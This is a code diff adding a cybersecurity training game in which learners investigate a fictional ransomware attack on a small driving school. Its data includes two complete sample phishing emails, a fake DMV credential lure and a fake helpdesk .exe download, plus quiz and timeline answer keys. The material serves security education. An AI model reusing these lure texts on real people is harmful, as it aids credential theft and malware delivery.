+            <p style="color: #888; margin-bottom: 15px;">Drag events into the correct chronological order. You must investigate emails, logs, and user data to determine when each event occurred.</p>
+
+            <div style="margin-bottom: 20px; padding: 15px; background: #16213e; border-radius: 10px; border: 2px solid #4a90e2;">
+                <h4 style="color: #4a90e2; margin-bottom: 10px;">📝 Timeline Notes</h4>
+                <p style="color: #888; font-size: 13px; margin-bottom: 10px;">Use this space to organize your findings before building the timeline:</p>
+                <textarea id="timeline-notes" style="width: 100%; min-height: 150px; background: #0f1419; color: #e0e0e0; border: 1px solid #333; border-radius: 5px; padding: 10px; font-family: 'Courier New', monospace; font-size: 13px; resize: vertical;" placeholder="Example:
+1. May 24: Lorem ipsum dolor sit amet, consectetur
+2. Jun 3: Adipiscing elit sed do eiusmod tempor
+3. Jun 7: Ut labore et dolore magna aliqua ut enim
+4. Jun 12: Quis nostrud exercitation ullamco laboris
+5. Jun 15: Duis aute irure dolor in reprehenderit
+..."></textarea>
+            </div>
+
+            <div class="timeline-builder">
+                <h4>Available Events (Drag to timeline below):</h4>
+                <div class="timeline-events" id="timeline-events">
+                    <!-- Will be populated by JavaScript -->
+                </div>
+
+                <h4>Your Timeline (Drop events here in chronological order):</h4>
+                <div class="timeline-drop-zone" id="timeline-drop-zone">
+                    <!-- Will be populated with numbered slots by JavaScript -->
+                </div>
+
+                <button class="submit-timeline-btn" id="submit-timeline-btn" onclick="submitTimeline()">Submit Timeline</button>
+
+                <div id="timeline-review-prompt" style="display: none; margin-top: 20px; padding: 20px; background: rgba(74, 144, 226, 0.08); border: 2px solid #4a90e2; border-radius: 8px; text-align: center;">
+                    <p style="color: #e0e0e0; font-size: 15px; margin-bottom: 15px;">Before giving you your timeline results, here are some review questions.</p>
+                    <button class="submit-timeline-btn" onclick="startTimelineReview()">Start Review Questions</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- IR Plan Tab -->
+        <div id="irplan-tab" class="tab-panel">
+            <h3>Incident Response Plan</h3>
+            <p style="color: #888; margin-bottom: 20px;">Based on your investigation, select the best incident response plan.</p>
+
+            <div id="irplan-lock-message" style="background: rgba(255, 255, 0, 0.1); border: 2px solid #ffff00; padding: 15px; margin-bottom: 20px; border-radius: 5px;">
+                <p style="color: #ffff00; font-weight: bold;">🔒 TIMELINE + REFLECTION REQUIRED</p>
+                <p style="color: #888; font-size: 14px; margin-top: 5px;">Complete the Attack Timeline first, then answer the Reflection Questions. Once both are done, you can submit your incident response plan.</p>
+            </div>
+
+            <div class="ir-plan-options">
+                <!-- Will be populated by JavaScript -->
+            </div>
+
+            <button class="submit-ir-btn" onclick="submitIRPlan()">Submit Response Plan</button>
+        </div>
+    </div>
+</div>
+
+<!-- Quiz Modal -->
+<div id="quiz-modal" class="quiz-modal">
+    <div class="quiz-content">
+        <div class="quiz-header">
+            <span>🎓</span>
+            <span id="quiz-title">Pop Quiz!</span>
+        </div>
+        <div class="quiz-question" id="quiz-question"></div>
+        <div class="quiz-options" id="quiz-options"></div>
+        <button class="quiz-submit-btn" id="quiz-submit-btn" onclick="submitQuizAnswer()">Submit Answer</button>
+        <div class="quiz-feedback" id="quiz-feedback"></div>
+        <button class="quiz-continue-btn" id="quiz-continue-btn" onclick="closeQuiz()" style="display: none;">Continue Investigation</button>
+    </div>
+</div>
+
+<!-- Email Analysis Modal -->
+<div id="email-analysis-modal" class="email-analysis-modal">
+    <div class="email-analysis-content">
+        <div class="quiz-header">
+            <span>📧</span>
+            <span>Email Analysis</span>
+        </div>
+        <button class="back-to-email-btn" onclick="backToEmail()">← Back to Email</button>
+        <div class="quiz-question" id="email-analysis-question"></div>
+        <div class="quiz-options" id="email-analysis-options"></div>
+        <button class="quiz-submit-btn" id="email-analysis-submit" onclick="submitEmailAnalysis()">Submit Analysis</button>
+        <div class="quiz-feedback" id="email-analysis-feedback"></div>
+        <button class="quiz-continue-btn" id="email-analysis-continue" onclick="closeEmailAnalysis()" style="display: none;">Continue Investigation</button>
+    </div>
+</div>
+
+<!-- User Audit Identification Modal -->
+<div id="audit-modal" class="quiz-modal">
+    <div class="quiz-content">
+        <div class="quiz-header">
+            <span>🔍</span>
+            <span>Identify Suspicious Activity</span>
+        </div>
+        <button class="back-to-email-btn" onclick="backToAudit()">← Back to User Audit</button>
+        <div class="quiz-question" id="audit-question"></div>
+        <div class="quiz-options" id="audit-options"></div>
+        <button class="quiz-submit-btn" id="audit-submit-btn" onclick="submitAuditIdentification()">Submit</button>
+        <div class="quiz-feedback" id="audit-feedback"></div>
+        <button class="quiz-continue-btn" id="audit-continue-btn" onclick="closeAuditModal()" style="display: none;">Continue Investigation</button>
+    </div>
+</div>
+
+<!-- Reflection Questions Screen -->
+<div id="reflection-screen" class="screen">
+    <div class="results-container">
+        <h1 style="color:#4a90e2; margin-bottom: 8px;">Reflection Questions</h1>
+        <p style="color:#888; margin-bottom: 30px; font-size: 14px;">Three questions to wrap up the investigation. 15 points each.</p>
+        <div id="reflection-questions-container"></div>
+        <button class="submit-ir-btn" id="reflection-submit-btn" onclick="submitReflection()" style="margin-top: 30px;">Submit &amp; See Results</button>
+    </div>
+</div>
+
+<!-- Results Screen -->
+<div id="results-screen" class="screen">
+    <div class="results-container">
+        <div id="decryption-status" style="margin-bottom: 30px;">
+            <!-- Will be populated by JavaScript based on success/failure -->
+        </div>
+
+        <h1 id="results-title">Investigation Complete!</h1>
+        <div class="final-score" id="final-score">0</div>
+        <p style="color: #888;">Total Points</p>
+
+        <div class="results-breakdown" id="results-breakdown">
+            <!-- Will be populated by JavaScript -->
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="continue-btn" onclick="showScreen('takeaway-screen')">Move On To Discussion Prompts</button>
+        </div>
+    </div>
+</div>
+
+<!-- Takeaway / Debrief Screen -->
+<div id="takeaway-screen" class="screen">
+    <div class="results-container">
+        <h1 style="margin-bottom: 10px;">Discussion Prompts</h1>
+        <p style="color: #888; margin-bottom: 25px;">Discuss these with your team — there are no wrong answers here, just honest conversation about what you'd take back to your own work, training program, or organization.</p>
+
+        <div style="background: rgba(74, 144, 226, 0.05); border: 1px solid #2a3a5a; border-radius: 8px; padding: 20px 24px;">
+            <div style="padding: 16px 0; border-bottom: 1px solid #2a3a5a;">
+                <p style="color: #4a90e2; font-weight: bold; margin-bottom: 8px;">1. The cheapest fix</p>
+                <p style="color: #e0e0e0; font-size: 14px; line-height: 1.6;">Which single control would have probably stopped this attack cold? (Hint: it's not the most expensive one.) Would the organizations you work for, volunteer with, or learn at have it in place?</p>
+            </div>
+
+            <div style="padding: 16px 0; border-bottom: 1px solid #2a3a5a;">
+                <p style="color: #4a90e2; font-weight: bold; margin-bottom: 8px;">2. Least Privilege in action</p>
+                <p style="color: #e0e0e0; font-size: 14px; line-height: 1.6;">A volunteer at SafeStart was given full admin rights "temporarily" and it was never revoked. How did ignoring the principle of Least Privilege directly harm the organization in this attack? Where could "temporary" access be lingering in places you know?</p>
+            </div>
+
+            <div style="padding: 16px 0; border-bottom: 1px solid #2a3a5a;">
+                <p style="color: #4a90e2; font-weight: bold; margin-bottom: 8px;">3. The first 30 minutes</p>
+                <p style="color: #e0e0e0; font-size: 14px; line-height: 1.6;">Whether at a job, workforce training program, club, or volunteer role: if you discovered a cyber incident right now, who would you tell first? Would they know what to do?</p>
+            </div>
+
+            <div style="padding: 16px 0;">
+                <p style="color: #4a90e2; font-weight: bold; margin-bottom: 8px;">4. Making the case</p>
+                <p style="color: #e0e0e0; font-size: 14px; line-height: 1.6;">If you had to convince a small-business owner or a workforce training program administrator to spend $500 this quarter on cybersecurity, what would you tell them based on what you saw today?</p>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="continue-btn" onclick="showScreen('results-screen')" style="background: transparent; border: 1px solid #4a90e2; color: #4a90e2;">← Back to Results</button>
+        </div>
+    </div>
+</div>
+
+<script>
+// DATA: Emails
+const emails = [
+    {
+        id: 'phishing-success',
+        from: 'dmv-compliance@dmv-state-portal.com',
+        to: 'director@safestartdriving.org',
+        date: 'March 21, 2026, 3:45 PM',
+        subject: 'URGENT: New Compliance Requirements for Driving Schools',
+        body: `Dear Valued Partner,
+
+We are reaching out to inform you about critical updates to our driving school certification requirements that must be completed immediately to maintain your organization's operational status.
+
+The Department of Motor Vehicles has recently implemented enhanced security protocols for all authorized driving instruction facilities. As part of these new requirements, we need you to verify your institution's current information and update your administrative credentials in our system.
+
+**Action Required:**
+Please click the link below to access the DMV Compliance Portal and complete the verification process within 24 hours to avoid any interruption to your certification status.
+
+[VERIFY YOUR ACCOUNT NOW]
+https://dmv-state-portal.com/verify-credentials
+
+This verification process is mandatory for all driving schools and must be completed by March 22, 2026. Failure to complete this process may result in temporary suspension of your ability to schedule DMV road tests for your students.
+
+If you have any questions or concerns regarding this matter, please do not hesitate to contact our support team at the email address provided above.
+
+Thank you for your prompt attention to this important matter.
+
+Best regards,
+DMV Compliance Division
+Department of Motor Vehicles
+State Certification Office`,
+        isPhishing: true,
+        phishingType: 'Urgency Phishing',
+        evidence: 'phishing-email',
+        identificationPoints: 15,
+        typePoints: 10,
+        feedback: {
+            correct: 'Correct! This is urgency phishing. Red flags: artificial deadline ("within 24 hours"), threat of losing certification, suspicious domain (dmv-state-portal.com instead of state.dmv.gov), and a request to enter credentials.',
+            incorrect: 'This IS phishing! Look for: suspicious domain (dmv-state-portal.com), artificial deadline ("within 24 hours"), threat of consequences, and a request to click a link and enter credentials.',
+            typeCorrect: 'Exactly! This is urgency phishing — it creates panic with a tight deadline and threat of losing certification to pressure the victim into acting before thinking.',
+            typeIncorrect: 'The correct answer is Urgency Phishing. Notice the artificial deadline ("within 24 hours") and the threat of suspended certification — designed to make you act fast without stopping to verify.'
+        }
+    },
+    {
+        id: 'phishing-failed',
+        from: 'support@safestartdriving-helpdesk.net',
+        to: 'director@safestartdriving.org',
+        date: 'March 18, 2026, 9:12 AM',
+        subject: 'RE: IT Support Request - Remote Access Required [SPAM]',
+        body: `Dear Valued User,
+
+We have recieved your ticket regarding the login issue you are experiencing. Our senior technician has reviewed your case and is ready to help resolve this for you.
+
+To fix the problem remotely, you will need to install our official support tool so the technician can access your machine directly. This will only take a few minutes and is completly safe.
+
+Please download the support tool here:
+http://safestartdriving-helpdesk.net/remote-support-tool.exe
+
+Once installed, our technician will contact your company. If we do not hear back, your support ticket will be closed and the issue may affect other staff acounts in your organisation.
+
+Do not reply to this email. For fastest service please use the download link above.
+
+Best Regards,
+IT Support Team
+IT Help-Desk Department
+
+--
+You are receiving this message because your address is on our support mailing list. To unsubscribe, click here: http://safestartdriving-helpdesk.net/unsubscribe?id=8847291`,
+        isPhishing: true,
+        phishingType: 'Standard Phishing (Mass Email)',
+        evidence: 'ai-phishing',
+        identificationPoints: 15,
+        typePoints: 10,
+        feedback: {
+            correct: 'Correct! This is phishing. Red flags: generic "Dear Valued User" greeting (no name), look-alike domain "safestartdriving-helpdesk.net" instead of the real "safestartdriving.org", insecure HTTP link, asking you to download and run an .exe file, small typos ("recieved", "acounts"), and a line discouraging you from replying.',
+            incorrect: 'This IS phishing! The sender domain is "safestartdriving-helpdesk.net" — not the real company domain. The greeting is generic ("Dear Valued User"), there are small typos, and legitimate IT staff would never ask you to download a remote tool from an HTTP link.',
+            typeCorrect: 'Exactly! This is standard mass-email phishing — the generic "Dear Valued User" greeting and lack of any personal details are the giveaway. The same email could be (and probably was) blasted to thousands of people hoping someone clicks.',
+            typeIncorrect: 'The correct answer is Standard Phishing (Mass Email). Notice the generic "Dear Valued User" greeting and complete lack of personal details — this email isn\'t targeted at a specific person, it\'s a mass blast hoping anyone will click.'
+        }
+    },
+    {
+        id: 'dmv-legit',
+        from: 'partnerships@state.dmv.gov',
+        to: 'director@safestartdriving.org',
+        date: 'March 15, 2026, 2:30 PM',
+        subject: 'April Test Schedule Confirmation',
+        body: `Hi Jennifer,
+
+Thanks for submitting your April road test schedule. I've confirmed the following slots for SafeStart students:
+
+- April 3, 10am-2pm (4 tests)
+- April 10, 9am-1pm (4 tests)
+- April 17, 1pm-4pm (3 tests)
+
+Let me know if you need to add any makeup slots. Also, reminder that we need your Q1 completion report by March 31.
+
+Mike
+Mike Chen
+Partnership Coordinator
+State DMV - Driving Schools Division
+(555) 234-5678 | mchen@state.dmv.gov`,
+        isPhishing: false,
+        phishingType: 'Legitimate Email',
+        evidence: null,
+        identificationPoints: 10,
+        typePoints: 0,
+        feedback: {
+            correct: 'Correct! This is a legitimate email. Signs: official .gov domain, casual professional tone, personal greeting (Hi Jennifer), specific details, direct phone number, realistic content.',
+            incorrect: 'This is actually LEGITIMATE! Look for: official state.dmv.gov domain, personal tone, specific details about actual business, direct contact info.',
+            typeCorrect: '',
+            typeIncorrect: ''
+        }
+    },
+    {
+        id: 'ai-leak-1',
+        from: 'sarah.martinez@safestartdriving.org',
+        to: 'tech@safestartdriving.org',
+        date: 'March 19, 2026, 11:15 AM',
+        subject: 'Help with donor spreadsheet?',
+        body: `Hey Alex,
+
+I'm trying to format our donor list for the spring fundraising campaign and the Excel file is a mess. Half the addresses are formatted weird and some cells have extra spaces. Do you have time to help clean it up today? The ED needs it by EOD.
+
+Thanks!
+Sarah
+
+Sarah Martinez
+Office Manager
+SafeStart Driving Academy`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: null,
+        feedback: {
+            correct: 'Correct — legitimate internal email. The sender is a real safestartdriving.org address and the content is a normal work request with no suspicious links.',
+            incorrect: 'This is actually a legitimate internal email. The sender domain is safestartdriving.org and the content is just a normal work request — no links, no credential requests.'
+        }
+    },
+    {
+        id: 'ai-leak-2',
+        from: 'sarah.martinez@safestartdriving.org',
+        to: 'tech@safestartdriving.org',
+        date: 'March 19, 2026, 2:45 PM',
+        subject: 'Re: Help with donor spreadsheet?',
+        body: `Never mind - I figured it out!
+
+I pasted the whole donor list into ChatGPT and asked it to clean up the formatting and it worked perfectly! It reformatted all the addresses and removed the extra spaces in like 2 seconds. So much faster than doing it manually.
+
+Thanks anyway!
+Sarah`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: 'ai-data-leak',
+        feedback: {
+            correct: 'Correct — legitimate internal email, but it reveals a serious security issue: sensitive donor data was pasted into ChatGPT. This is an AI data leak, not a phishing attack.',
+            incorrect: 'This is a legitimate internal email — but read it carefully. It reveals that donor data was pasted into ChatGPT, which is a serious data security violation worth investigating.'
+        }
+    },
+    {
+        id: 'ai-leak-3',
+        from: 'alex.wong@safestartdriving.org',
+        to: 'sarah.martinez@safestartdriving.org',
+        date: 'March 19, 2026, 3:30 PM',
+        subject: 'RE: Help with donor spreadsheet? - URGENT',
+        body: `Sarah,
+
+Please tell me you didn't paste our actual donor data into ChatGPT. That data includes:
+- Full names and addresses
+- Phone numbers and emails
+- Donation amounts
+- Some credit card info
+
+ChatGPT stores and learns from input data. Our donor information may now be in their training data or accessible to their systems. This is a serious data privacy violation.
+
+We need to discuss this with Jennifer immediately.
+
+Alex Wong
+IT Coordinator`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: 'ai-data-leak',
+        feedback: {
+            correct: 'Correct — legitimate internal email. This is IT flagging a data security incident, not a phishing attempt.',
+            incorrect: 'This is a legitimate internal email from IT. Focus on what it reveals: sensitive donor data may have been exposed through an AI tool.'
+        }
+    },
+    {
+        id: 'redherring-1a',
+        from: 'system@safestartdriving.org',
+        to: 'admin@safestartdriving.org',
+        date: 'March 21, 2026, 8:31 AM',
+        subject: 'Multiple failed login attempts detected',
+        body: `SECURITY ALERT
+
+User: sarah.martinez
+Failed login attempts: 15
+Time: March 21, 8:28-8:31 AM
+IP Address: 192.168.1.45 (Office Network)
+Status: Account locked for 15 minutes`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: null,
+        feedback: {
+            correct: 'Correct — this is an automated system alert from the internal network, not a phishing email. Note the IP address — it\'s an internal office address (192.168.1.x), not a foreign one.',
+            incorrect: 'This is a legitimate automated system alert from safestartdriving.org. The IP address (192.168.1.45) is an internal office address — this is a clue about something else entirely.'
+        }
+    },
+    {
+        id: 'redherring-1b',
+        from: 'sarah.martinez@safestartdriving.org',
+        to: 'alex.wong@safestartdriving.org',
+        date: 'March 21, 2026, 8:35 AM',
+        subject: 'Locked out again 😞',
+        body: `Alex,
+
+Ugh, I forgot my password AGAIN and locked myself out. I swear I need to write these down somewhere. Can you unlock my account?
+
+Sorry!
+Sarah`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: 'weak-passwords',
+        feedback: {
+            correct: 'Correct — legitimate internal email. But note what it reveals: staff are using passwords they can\'t remember and have no MFA to fall back on.',
+            incorrect: 'This is a legitimate internal email. However it\'s still useful evidence — it tells you something about the organization\'s password habits.'
+        }
+    },
+    {
+        id: 'redherring-2',
+        from: 'alex.wong@safestartdriving.org',
+        to: 'staff@safestartdriving.org',
+        date: 'March 17, 2026, 1:00 PM',
+        subject: 'New DMV software installation tomorrow',
+        body: `Team,
+
+Tomorrow afternoon I'll be installing the new DMV Driver Education Software v2.4 on all instructor computers. This is the updated curriculum software the DMV sent us.
+
+The installer file is called "DriverUpdate.exe" - you may see a security warning because it's not from a major publisher, but it's legitimate software from the DMV.
+
+Installation should take 10-15 minutes per computer. Please save your work before 3pm.
+
+Thanks,
+Alex`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: null,
+        feedback: {
+            correct: 'Correct — legitimate internal email from IT. This explains the "DriverUpdate.exe" you may have seen elsewhere — it was approved software, not malware.',
+            incorrect: 'This is a legitimate internal email from the IT coordinator. It actually clears up a potential red herring — the DriverUpdate.exe was approved DMV software.'
+        }
+    },
+    {
+        id: 'volunteer-admin',
+        from: 'director@safestartdriving.org',
+        to: 'alex.wong@safestartdriving.org',
+        date: 'February 15, 2026, 10:00 AM',
+        subject: 'Temp admin access for Marcus',
+        body: `Alex,
+
+Can you give Marcus (our volunteer) admin rights for the next few weeks? He's helping me reorganize our digital files and needs access to all the folders.
+
+Just temporary - we can remove it once the project is done.
+
+Thanks,
+Jennifer
+
+Jennifer Wallace
+Executive Director`,
+        isPhishing: false,
+        identificationPoints: 5,
+        evidence: 'excessive-privileges',
+        feedback: {
+            correct: 'Correct — legitimate internal email. But this is critical evidence: a volunteer was granted admin rights on February 15 with no follow-up email removing them.',
+            incorrect: 'This is a legitimate internal email — but it\'s one of the most important ones. A volunteer was given admin rights "temporarily" with no record of those rights ever being removed.'
+        }
+    }
+];
+
+// DATA: Evidence Cards
+const evidenceCards = [
+    { id: 'phishing-email', title: 'Phishing Email Detected', points: 15, description: 'Urgency phishing email disguised as DMV compliance notice sent to Executive Director on March 21.' },
+    { id: 'credentials-compromised', title: 'Credentials Compromised', points: 20, description: 'Director clicked malicious link and entered password on fake site.' },
+    { id: 'foreign-ip', title: 'Foreign IP Login', points: 20, description: 'Successful login from Bulgaria (IP: 185.220.101.47) on March 21.' },
+    { id: 'excessive-privileges', title: 'Excessive Privileges', points: 20, description: 'Volunteer account had Domain Admin rights since February 15.' },
+    { id: 'no-mfa', title: 'No MFA Enabled', points: 15, description: 'No multi-factor authentication on any system accounts.' },
+    { id: 'ai-data-leak', title: 'AI Data Leak', points: 20, description: 'Sensitive donor data pasted into ChatGPT on March 19.' },
+    { id: 'privilege-escalation', title: 'Privilege Escalation', points: 15, description: 'Attacker used volunteer account to gain full system access.' },
+    { id: 'ransomware-deployed', title: 'Ransomware Deployed', points: 15, description: 'Malicious executable deployed on March 23.' },
+    { id: 'weak-passwords', title: 'Weak Password Policy', points: 10, description: 'System allowed weak passwords like "SafeRoad1".' },
+    { id: 'ai-phishing', title: 'Mass-Email Phishing', points: 10, description: 'Generic mass-blast phishing email caught by spam filter, attempting to deliver a malicious remote-access tool.' }
+];
+
+// DATA: Timeline Events (dates hidden from users - they must investigate to determine order)
+const timelineEvents = [
+    { id: 1, text: 'A volunteer is given admin-level access to help with a project', correctOrder: 1, hiddenDate: 'Feb 15' },
+    { id: 2, text: 'A fake email pretending to be from the DMV is sent to the Director', correctOrder: 2, hiddenDate: 'Mar 21' },
+    { id: 3, text: 'The Director clicks the link and enters her password on the fake site', correctOrder: 3, hiddenDate: 'Mar 21' },
+    { id: 4, text: 'The attacker logs in from a foreign country using the stolen password', correctOrder: 4, hiddenDate: 'Mar 21' },
+    { id: 5, text: 'The attacker explores the system and finds the volunteer\'s admin account', correctOrder: 5, hiddenDate: 'Mar 21' },
+    { id: 6, text: 'The attacker uploads ransomware code to the server', correctOrder: 6, hiddenDate: 'Mar 22' },
+    { id: 7, text: 'The attacker schedules the ransomware to run at 8:00 AM', correctOrder: 7, hiddenDate: 'Mar 23' },
+    { id: 8, text: 'Files are encrypted and staff discover the ransom note', correctOrder: 8, hiddenDate: 'Mar 24' }
+];
+
+// DATA: Quiz Questions
+const quizQuestions = [
+    {
+        id: 'phishing-quiz',
+        trigger: 'phishing-email',
+        question: 'You just found a phishing email that used urgency to trick its target. Why is urgency such an effective tactic in phishing attacks?',
+        options: [
+            { text: 'It makes the email look more official and legitimate', correct: false },
+            { text: 'It pressures the victim to act quickly before they have time to think or verify', correct: true },
+            { text: 'It bypasses spam filters automatically', correct: false },
+            { text: 'It only works on people who are not tech-savvy', correct: false }
+        ],
+        feedback: {
+            correct: 'Correct! Urgency short-circuits critical thinking. When someone believes they have 24 hours before their account is suspended or certification revoked, they often act on instinct rather than stopping to verify the sender or the link.',
+            incorrect: 'Not quite. The power of urgency is that it bypasses careful thinking — when people feel they must act NOW, they skip the verification steps that would reveal the scam.'
+        },
+        points: 15
+    },
+    {
+        id: 'ai-safety-quiz',
+        trigger: 'ai-data-leak',
+        question: 'The Office Manager pasted sensitive donor data into ChatGPT. Why is this a serious security violation?',
+        options: [
+            { text: 'ChatGPT charges money for each use', correct: false },
+            { text: 'Data entered into AI tools may be stored, used for training, or accessible to the company, creating potential data breaches', correct: true },
+            { text: 'ChatGPT automatically shares all data with hackers', correct: false },
+            { text: 'Using AI tools is always illegal', correct: false }
+        ],
+        feedback: {
+            correct: 'Exactly! When you paste data into AI tools like ChatGPT, that information may be stored by the company, used to train future models, or viewed by their staff. For sensitive data (names, addresses, financial info), this violates privacy and could lead to data breaches.',
+            incorrect: 'Not quite. The issue is that AI companies may store, use for training, or access the data you input. This means sensitive information could be exposed beyond your organization, violating privacy regulations and putting people at risk.'
+        },
+        points: 15
+    },
+    {
+        id: 'privilege-quiz',
+        trigger: 'excessive-privileges',
+        question: 'A volunteer was given full admin access "temporarily" but it was never removed. What cybersecurity principle does this violate?',
+        options: [
+            { text: 'Principle of Least Privilege - users should only have the minimum access needed for their role', correct: true },
+            { text: 'Principle of Maximum Security - everyone should have full access to everything', correct: false },
+            { text: 'Principle of Trust - we should trust all employees equally', correct: false },
+            { text: 'Principle of Convenience - it\'s easier to give everyone full access', correct: false }
+        ],
+        feedback: {
+            correct: 'Correct! The Principle of Least Privilege means giving users only the minimum access they need to do their job - nothing more. "Temporary" elevated access should always be revoked when no longer needed. In this case, the attacker exploited the volunteer\'s excessive privileges to deploy ransomware.',
+            incorrect: 'The correct answer is Least Privilege. This security principle states that users should only have the minimum permissions necessary for their role. Temporary elevated access should always be removed when the task is complete.'
+        },
+        points: 15
+    },
+    {
+        id: 'mfa-quiz',
+        trigger: 'no-mfa',
+        question: 'None of the accounts at SafeStart had Multi-Factor Authentication (MFA) enabled. How would MFA have helped prevent this attack?',
+        options: [
+            { text: 'MFA would have made passwords unnecessary', correct: false },
+            { text: 'Even though the attacker stole the password, they couldn\'t log in without the second factor (like a phone code)', correct: true },
+            { text: 'MFA automatically blocks all phishing emails', correct: false },
+            { text: 'MFA prevents viruses from infecting computers', correct: false }
+        ],
+        feedback: {
+            correct: 'Exactly! MFA (Multi-Factor Authentication) requires two forms of verification - something you know (password) AND something you have (phone, security key). Even though the attacker phished the Director\'s password, they wouldn\'t have had the second factor, blocking the attack.',
+            incorrect: 'MFA requires TWO forms of verification to log in. Even if an attacker steals your password (something you know), they still need the second factor (something you have, like your phone) to access the account. This would have stopped the Bulgaria login attempt.'
+        },
+        points: 15
+    },
+    {
+        id: 'terminal-access-quiz',
+        trigger: 'foreign-ip',
+        question: 'An attacker logging in from an odd-looking IP address was able to use the terminal to access sensitive system logs and deploy ransomware. Why is unrestricted terminal access dangerous?',
+        options: [
+            { text: 'Terminal access allows direct control of the system, bypassing normal security restrictions', correct: true },
+            { text: 'Terminals use too much electricity', correct: false },
+            { text: 'Only IT professionals should know terminal commands', correct: false },
+            { text: 'Terminals automatically share information with everyone', correct: false }
+        ],
+        feedback: {
+            correct: 'Correct! Terminal (command line) access provides powerful, direct control over a system. Users with terminal access can view sensitive files, modify system settings, install software, and execute commands that bypass normal application security. This is why terminal access should be restricted to authorized IT staff only.',
+            incorrect: 'Terminal access gives direct, powerful control over a computer system. With terminal access, someone can read sensitive files, change system settings, install malicious software, and bypass security controls. That\'s why it should be restricted to authorized personnel only.'
+        },
+        points: 15
+    }
+];
+
+// Game State - add quiz tracking
+const gameState = {
+    currentGroup: '',
+    score: 0,
+    emailPoints: 0,
+    discoveredEvidence: new Set(),
+    emailsRead: new Set(),
+    analyzedEmails: new Set(),
+    currentDirectory: '/home/forensic',
+    logicalDirectory: '/home/forensic', // The path shown to user (follows symlinks as typed)
+    commandHistory: [],
+    timelineSubmitted: false,
+    timelineCorrect: false,
+    timelinePoints: 0,
+    irPlanSubmitted: false,
+    irPlanCorrect: false,
+    answeredQuizzes: new Set(),
+    pendingQuiz: null,
+    currentEmail: null,
+    emailAnalysisStep: 1,
+    auditIdentified: new Set(),
+    auditWrongGuesses: 0,
+    currentAuditRow: null,
+    reflectionPoints: 0,
+    reflectionAnswered: 0,
+    reflectionSubmitted: false
+};
+
+// Initialize on page load — only login-screen + global setup.
+// Portal components are initialized lazily by showIRPortal() so their event
+// listeners only get attached once per session.
+document.addEventListener('DOMContentLoaded', function() {
+    initializeLogin();
+    initializeQuiz();
+    preventBackButton();
+});
+
+// Prevent browser back button from breaking the app
+function preventBackButton() {
+    // Add a history state when the page loads
+    history.pushState(null, null, location.href);
+
+    // Listen for back button
+    window.addEventListener('popstate', function() {
+        // Push the state back to prevent navigation
+        history.pushState(null, null, location.href);
+
+        // Show a warning
+        if (gameState.currentGroup) {
+            alert('Please use the navigation within the application. Using the browser back button may cause issues with your progress.');
+        }
+    });
+
+    // Also prevent page unload if in middle of exercise
+    window.addEventListener('beforeunload', function(e) {
+        if (gameState.currentGroup && !gameState.irPlanSubmitted) {
+            e.preventDefault();
+            e.returnValue = 'Your progress will be lost if you leave this page. Are you sure?';
+            return e.returnValue;
+        }
+    });
+}
+
+// Quiz System
+function initializeQuiz() {
+    // Quiz will be triggered by evidence discovery
+}
+
+function showQuiz(quizId) {
+    if (gameState.answeredQuizzes.has(quizId)) return;
+
+    const quiz = quizQuestions.find(q => q.id === quizId);
+    if (!quiz) return;
+
+    gameState.pendingQuiz = quiz;
+
+    document.getElementById('quiz-question').textContent = quiz.question;
+
+    const optionsContainer = document.getElementById('quiz-options');
+    optionsContainer.innerHTML = '';
+
+    quiz.options.forEach((option, index) => {
+        const optionEl = document.createElement('div');
+        optionEl.className = 'quiz-option';
+        optionEl.dataset.index = index;
+        optionEl.dataset.correct = option.correct;
+        optionEl.textContent = option.text;
+        optionEl.onclick = () => selectQuizOption(index);
+        optionsContainer.appendChild(optionEl);
+    });
+
+    document.getElementById('quiz-submit-btn').style.display = 'block';
+    document.getElementById('quiz-continue-btn').style.display = 'none';
+    document.getElementById('quiz-feedback').classList.remove('visible');
+    document.getElementById('quiz-modal').classList.add('active');
+}
+
+function selectQuizOption(index) {
+    document.querySelectorAll('.quiz-option').forEach(opt => opt.classList.remove('selected'));
+    document.querySelector(`.quiz-option[data-index="${index}"]`).classList.add('selected');
+}
+
+function submitQuizAnswer() {
+    const selected = document.querySelector('.quiz-option.selected');
+    if (!selected) {
+        alert('Please select an answer first.');
+        return;
+    }
+
+    const quiz = gameState.pendingQuiz;
+    if (!quiz || gameState.answeredQuizzes.has(quiz.id)) {
+        return; // Already scored — defense in depth
+    }
+    const isCorrect = selected.dataset.correct === 'true';
+
+    document.querySelectorAll('.quiz-option').forEach(opt => {
+        opt.onclick = null;
+        if (opt.dataset.correct === 'true') {
+            opt.classList.add('correct');
+        } else if (opt.classList.contains('selected')) {
+            opt.classList.add('incorrect');
+        }
+    });
+
+    const feedbackEl = document.getElementById('quiz-feedback');
+    if (isCorrect) {
+        feedbackEl.textContent = `✓ Correct! +${quiz.points} points\n\n${quiz.feedback.correct}`;
+        gameState.score += quiz.points;
+        updateScore();
+    } else {
+        feedbackEl.textContent = quiz.feedback.incorrect;
+    }
+    feedbackEl.classList.add('visible');
+    feedbackEl.classList.add(isCorrect ? 'correct' : 'incorrect');
+
+    gameState.answeredQuizzes.add(quiz.id);
+    document.getElementById('quiz-submit-btn').style.display = 'none';
+    document.getElementById('quiz-continue-btn').style.display = 'block';
+}
+
+function closeQuiz() {
+    const justClosedId = gameState.pendingQuiz && gameState.pendingQuiz.id;
+    document.getElementById('quiz-modal').classList.remove('active');
+    document.getElementById('quiz-feedback').classList.remove('visible', 'correct', 'incorrect');
+    gameState.pendingQuiz = null;
+
+    // Chain: phishing → ai-safety (pop-quiz pair after all emails analyzed)
+    if (justClosedId === 'phishing-quiz' && !gameState.answeredQuizzes.has('ai-safety-quiz')) {
+        showQuiz('ai-safety-quiz');
+        return;
+    }
+
+    // Chain: timeline review questions (privilege → mfa → terminal), then reveal results
+    if (justClosedId === 'privilege-quiz' && !gameState.answeredQuizzes.has('mfa-quiz')) {
+        showQuiz('mfa-quiz');
+        return;
+    }
+    if (justClosedId === 'mfa-quiz' && !gameState.answeredQuizzes.has('terminal-access-quiz')) {
+        showQuiz('terminal-access-quiz');
+        return;
+    }
